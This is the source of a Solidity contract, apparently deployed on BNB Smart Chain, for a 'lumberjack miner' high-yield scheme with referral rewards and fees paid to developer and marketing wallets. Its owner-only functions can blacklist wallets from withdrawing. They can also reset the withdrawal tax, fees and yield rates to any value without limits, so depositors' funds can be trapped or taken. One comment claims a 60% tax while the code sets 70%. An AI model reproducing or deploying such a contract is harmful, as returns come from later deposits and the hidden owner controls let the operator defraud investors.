/**
 *Submitted for verification at BscScan.com on 2022-06-17
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract Number98 {
    using SafeMath for uint256;

    /** base default parameters **/
    uint256 public EGGS_TO_HIRE_1MINERS = 1440000;      /** up to daily 6% earning **/
    uint256 public REFERRAL = 100;  //10%
    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 private TAX = 50;       //5%
    uint256 private MKT = 50;       //5%
    uint256 private TAX_S = 50;       //5%
    uint256 private MKT_S = 50;       //5%

    uint256 public MARKET_EGGS_DIVISOR = 5;
    uint256 public MARKET_EGGS_DIVISOR_SELL = 2;

    uint256 public MIN_INVEST_LIMIT = 50 * 1e16; /** 0.5 BNB  **/
    uint256 public WALLET_DEPOSIT_LIMIT = 100 * 1e18; /** 100 BNB  **/

    uint256 public COMPOUND_BONUS = 20;
    uint256 public COMPOUND_BONUS_MAX_TIMES = 10;
    uint256 public COMPOUND_STEP = 12 * 60 * 60;

    uint256 public WITHDRAWAL_TAX = 700;
    uint256 public COMPOUND_FOR_NO_TAX_WITHDRAWAL = 6;

    uint256 public totalStaked;
    uint256 public totalDeposits;
    uint256 public totalCompound;
    uint256 public totalRefBonus;
    uint256 public totalWithdrawn;

    uint256 private marketEggs;
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    bool private contractStarted;
    bool public blacklistActive = false;    
    bool public whitelistActive = true;
    mapping(address => bool) public blacklisted;
    mapping(address => bool) public whitelisted;

    uint256 public CUTOFF_STEP = 48 * 60 * 60;    
    uint256 public WITHDRAW_COOLDOWN = 4 * 60 * 60;    

    /* addresses */
    address private owner;
    address payable private dev;
    address payable private mkt;

    struct User {
        uint256 initialDeposit;
        uint256 userDeposit;
        uint256 miners;
        uint256 claimedEggs;
        uint256 lastHatch;
        address referrer;
        uint256 referralsCount;
        uint256 referralEggRewards;
        uint256 totalWithdrawn;
        uint256 dailyCompoundBonus;
        uint256 farmerCompoundCount; //added to monitor farmer consecutive compound without cap
        uint256 lastWithdrawTime;
    }

    mapping(address => User) public users;

    constructor(address payable _dev, address payable _mkt) {
        require(!isContract(_dev) && !isContract(_mkt));
        owner = msg.sender;
        dev = _dev;
        mkt = _mkt;
        marketEggs = 144000000000;
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function whiteListWallet(address Wallet, bool isWhitelisted) public{
        require(msg.sender == owner, "Admin use only.");
        whitelisted[Wallet] = isWhitelisted;
    }

    function whiteMultipleWallets(address[] calldata Wallet, bool isWhitelisted) public{
        require(msg.sender == owner, "Admin use only.");
        for(uint256 i = 0; i < Wallet.length; i++) {
            whitelisted[Wallet[i]] = isWhitelisted;
        }
    }

    function checkIfWhitelisted(address Wallet) public view returns(bool isWhitelisted){
        isWhitelisted = whitelisted[Wallet];
    }

    function setblacklistActive(bool isActive) public{
        require(msg.sender == owner, "Admin use only.");
        blacklistActive = isActive;
    }

    function blackListWallet(address Wallet, bool isBlacklisted) public{
        require(msg.sender == owner, "Admin use only.");
        blacklisted[Wallet] = isBlacklisted;
    }

    function blackMultipleWallets(address[] calldata Wallet, bool isBlacklisted) public{
        require(msg.sender == owner, "Admin use only.");
        for(uint256 i = 0; i < Wallet.length; i++) {
            blacklisted[Wallet[i]] = isBlacklisted;
        }
    }

    function checkIfBlacklisted(address Wallet) public view returns(bool isBlacklisted){
        require(msg.sender == owner, "Admin use only.");
        isBlacklisted = blacklisted[Wallet];
    }

    function hireMoreLumberjacks(bool isCompound) public {
        User storage user = users[msg.sender];
        require(contractStarted || msg.sender == mkt, "Contract not yet Started.");

        uint256 eggsUsed = getMyEggs();
        uint256 eggsForCompound = eggsUsed;

        if(isCompound) {
            uint256 dailyCompoundBonus = getDailyCompoundBonus(msg.sender, eggsForCompound);
            eggsForCompound = eggsForCompound.add(dailyCompoundBonus);
            uint256 eggsUsedValue = calculateEggSell(eggsForCompound);
            user.userDeposit = user.userDeposit.add(eggsUsedValue);
            totalCompound = totalCompound.add(eggsUsedValue);
        } 

        if(block.timestamp.sub(user.lastHatch) >= COMPOUND_STEP) {
            if(user.dailyCompoundBonus < COMPOUND_BONUS_MAX_TIMES) {
                user.dailyCompoundBonus = user.dailyCompoundBonus.add(1);
            }
            //add compoundCount for monitoring purposes.
            user.farmerCompoundCount = user.farmerCompoundCount .add(1);
        }
        
        user.miners = user.miners.add(eggsForCompound.div(EGGS_TO_HIRE_1MINERS));
        user.claimedEggs = 0;
        user.lastHatch = block.timestamp;

        marketEggs = marketEggs.add(eggsUsed.div(MARKET_EGGS_DIVISOR));
    }

    function sellWood() public{
        require(contractStarted, "Contract not yet Started.");

        if (blacklistActive) {
            require(!blacklisted[msg.sender], "Address is blacklisted.");
        }

        User storage user = users[msg.sender];
        uint256 hasEggs = getMyEggs();
        uint256 eggValue = calculateEggSell(hasEggs);
        
        /** 
            if user compound < to mandatory compound days**/
        if(user.dailyCompoundBonus < COMPOUND_FOR_NO_TAX_WITHDRAWAL){
            //daily compound bonus count will not reset and eggValue will be deducted with 60% feedback tax.
            eggValue = eggValue.sub(eggValue.mul(WITHDRAWAL_TAX).div(PERCENTS_DIVIDER));
        }else{
            //set daily compound bonus count to 0 and eggValue will remain without deductions
             user.dailyCompoundBonus = 0;   
             user.farmerCompoundCount = 0;  
        }
        
        user.lastWithdrawTime = block.timestamp;
        user.claimedEggs = 0;  
        user.lastHatch = block.timestamp;
        marketEggs = marketEggs.add(hasEggs.div(MARKET_EGGS_DIVISOR_SELL));
        
        if(getBalance() < eggValue) {
            eggValue = getBalance();
        }

        uint256 eggsPayout = eggValue.sub(sellPayFees(eggValue));
        payable(address(msg.sender)).transfer(eggsPayout);
        user.totalWithdrawn = user.totalWithdrawn.add(eggsPayout);
        totalWithdrawn = totalWithdrawn.add(eggsPayout);
    }

    /** transfer amount of BNB **/
    function putToWorkLumberjacks(address ref) public payable{
        if (whitelistActive) {
            require(checkIfWhitelisted(msg.sender), "Address is not Whitelisted.");           
        } else {
            require(contractStarted, "Contract not yet Started.");
        }

        User storage user = users[msg.sender];
        require(msg.value >= MIN_INVEST_LIMIT, "Mininum investment not met.");
        require(user.initialDeposit.add(msg.value) <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");
        uint256 eggsBought = calculateEggBuy(msg.value, address(this).balance.sub(msg.value));
        user.userDeposit = user.userDeposit.add(msg.value);
        user.initialDeposit = user.initialDeposit.add(msg.value);
        user.claimedEggs = user.claimedEggs.add(eggsBought);

        if (user.referrer == address(0)) {
            if (ref != msg.sender) {
                user.referrer = ref;
            }

            address upline1 = user.referrer;
            if (upline1 != address(0)) {
                users[upline1].referralsCount = users[upline1].referralsCount.add(1);
            }
        }
                
        if (user.referrer != address(0)) {
            address upline = user.referrer;
            if (upline != address(0)) {
                uint256 refRewards = msg.value.mul(REFERRAL).div(PERCENTS_DIVIDER);
                payable(address(upline)).transfer(refRewards);
                users[upline].referralEggRewards = users[upline].referralEggRewards.add(refRewards);
                totalRefBonus = totalRefBonus.add(refRewards);
            }
        }

        uint256 eggsPayout = payFees(msg.value);
        totalStaked = totalStaked.add(msg.value.sub(eggsPayout));
        totalDeposits = totalDeposits.add(1);
        hireMoreLumberjacks(false);
    }

    function startFarm(address addr) public payable{
        if (!contractStarted) {
            if (msg.sender == owner) {
                contractStarted = true;
                putToWorkLumberjacks(addr);
            } else revert("Contract not yet started.");
        }
    }

    function fundContractAndHoard() public payable{
        require(msg.sender == mkt, "Admin use only.");
        User storage user = users[msg.sender];
        uint256 eggsBought = calculateEggBuy(msg.value, address(this).balance.sub(msg.value));
        user.userDeposit = user.userDeposit.add(msg.value);
        user.initialDeposit = user.initialDeposit.add(msg.value);
        user.claimedEggs = user.claimedEggs.add(eggsBought);
        hireMoreLumberjacks(false);
    }

    //fund contract with BNB before launch.
    function fundContract() external payable {}


    function payFees(uint256 eggValue) internal returns(uint256){
        uint256 tax = eggValue.mul(TAX).div(PERCENTS_DIVIDER);
        uint256 mktng = eggValue.mul(MKT).div(PERCENTS_DIVIDER);
        dev.transfer(tax);
        mkt.transfer(mktng);
        return mktng.add(tax);
    }

    function sellPayFees(uint256 eggValue) internal returns(uint256){
        uint256 tax = eggValue.mul(TAX_S).div(PERCENTS_DIVIDER);
        uint256 mktng = eggValue.mul(MKT_S).div(PERCENTS_DIVIDER);
        dev.transfer(tax);
        mkt.transfer(mktng);
        return mktng.add(tax);
    }

    function getDailyCompoundBonus(address _adr, uint256 amount) public view returns(uint256){
        if(users[_adr].dailyCompoundBonus == 0) {
            return 0;
        } else {
            uint256 totalBonus = users[_adr].dailyCompoundBonus.mul(COMPOUND_BONUS); 
            uint256 result = amount.mul(totalBonus).div(PERCENTS_DIVIDER);
            return result;
        }
    }

    function getUserInfo(address _adr) public view returns(uint256 _initialDeposit, uint256 _userDeposit, uint256 _miners,
     uint256 _claimedEggs, uint256 _lastHatch, address _referrer, uint256 _referrals,
     uint256 _totalWithdrawn, uint256 _referralEggRewards, uint256 _dailyCompoundBonus, uint256 _farmerCompoundCount, uint256 _lastWithdrawTime) {
         _initialDeposit = users[_adr].initialDeposit;
         _userDeposit = users[_adr].userDeposit;
         _miners = users[_adr].miners;
         _claimedEggs = users[_adr].claimedEggs;
         _lastHatch = users[_adr].lastHatch;
         _referrer = users[_adr].referrer;
         _referrals = users[_adr].referralsCount;
         _totalWithdrawn = users[_adr].totalWithdrawn;
         _referralEggRewards = users[_adr].referralEggRewards;
         _dailyCompoundBonus = users[_adr].dailyCompoundBonus;
         _farmerCompoundCount = users[_adr].farmerCompoundCount;
         _lastWithdrawTime = users[_adr].lastWithdrawTime;
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    function getTimeStamp() public view returns (uint256) {
        return block.timestamp;
    }

    function getAvailableEarnings(address _adr) public view returns(uint256) {
        uint256 userEggs = users[_adr].claimedEggs.add(getEggsSinceLastHatch(_adr));
        return calculateEggSell(userEggs);
    }

    //  Supply and demand balance algorithm 
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
    // (PSN * bs)/(PSNH + ((PSN * rs + PSNH * rt) / rt)); PSN / PSNH == 1/2
    // bs * (1 / (1 + (rs / rt)))
    // purchase ： marketEggs * 1 / ((1 + (this.balance / eth)))
    // sell ： this.balance * 1 / ((1 + (marketEggs / eggs)))
        return SafeMath.div(
                SafeMath.mul(PSN, bs), 
                    SafeMath.add(PSNH, 
                        SafeMath.div(
                            SafeMath.add(
                                SafeMath.mul(PSN, rs), 
                                    SafeMath.mul(PSNH, rt)), 
                                        rt)));
    }

    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs, marketEggs, getBalance());
    }

    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth, contractBalance, marketEggs);
    }

    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth, getBalance());
    }

    /** How many miners and eggs per day user will recieve based on BNB deposit **/
    function getEggsYield(uint256 amount) public view returns(uint256,uint256) {
        uint256 eggsAmount = calculateEggBuy(amount , getBalance().add(amount).sub(amount));
        uint256 miners = eggsAmount.div(EGGS_TO_HIRE_1MINERS);
        uint256 day = 1 days;
        uint256 eggsPerDay = day.mul(miners);
        uint256 earningsPerDay = calculateEggSellForYield(eggsPerDay, amount);
        return(miners, earningsPerDay);
    }

    function calculateEggSellForYield(uint256 eggs,uint256 amount) public view returns(uint256){
        return calculateTrade(eggs,marketEggs, getBalance().add(amount));
    }

    function getSiteInfo() public view returns (uint256 _totalStaked, uint256 _totalDeposits, uint256 _totalCompound, uint256 _totalRefBonus) {
        return (totalStaked, totalDeposits, totalCompound, totalRefBonus);
    }

    function getMyMiners() public view returns(uint256){
        return users[msg.sender].miners;
    }

    function getMyEggs() public view returns(uint256){
        return users[msg.sender].claimedEggs.add(getEggsSinceLastHatch(msg.sender));
    }

    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsSinceLastHatch = block.timestamp.sub(users[adr].lastHatch);
                            /** get min time. **/
        uint256 cutoffTime = min(secondsSinceLastHatch, CUTOFF_STEP);
        uint256 secondsPassed = min(EGGS_TO_HIRE_1MINERS, cutoffTime);
        return secondsPassed.mul(users[adr].miners);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }


    function setInvestMin(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        MIN_INVEST_LIMIT = value;
    }
   
    function setWhitelistActive(bool value) external {
        require(msg.sender == owner, "Admin use only.");
        whitelistActive = value;
    }
 
    function setParamsFirst(bool _whitelistActive, uint256 _MIN_INVEST_LIMIT, uint256 _EGGS_TO_HIRE_1MINERS, uint256 _WITHDRAWAL_TAX,
                    uint256 _TAX, uint256 _MKT, uint256 _TAX_S, uint256 _MKT_S, uint256 _REFERRAL) external {
        require(msg.sender == owner, "Admin use only.");
        whitelistActive = _whitelistActive;
        MIN_INVEST_LIMIT = _MIN_INVEST_LIMIT;
        EGGS_TO_HIRE_1MINERS = _EGGS_TO_HIRE_1MINERS;
        TAX = _TAX;
        MKT = _MKT;
        TAX_S = _TAX_S;
        MKT_S = _MKT_S;
        WITHDRAWAL_TAX = _WITHDRAWAL_TAX;
        REFERRAL = _REFERRAL;
    }

    function setParamsSecond(uint256 _CUTOFF_STEP, uint256 _COMPOUND_STEP,
                        uint256 _MARKET_EGGS_DIVISOR, uint256 _MARKET_EGGS_DIVISOR_SELL,
                        uint256 _COMPOUND_FOR_NO_TAX_WITHDRAWAL, uint256 _WITHDRAW_COOLDOWN) external {
        require(msg.sender == owner, "Admin use only.");
        CUTOFF_STEP = _CUTOFF_STEP;
        COMPOUND_STEP = _COMPOUND_STEP;
        MARKET_EGGS_DIVISOR = _MARKET_EGGS_DIVISOR;
        MARKET_EGGS_DIVISOR_SELL = _MARKET_EGGS_DIVISOR_SELL;
        COMPOUND_FOR_NO_TAX_WITHDRAWAL = _COMPOUND_FOR_NO_TAX_WITHDRAWAL;
        WITHDRAW_COOLDOWN = _WITHDRAW_COOLDOWN;
    }

}

library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}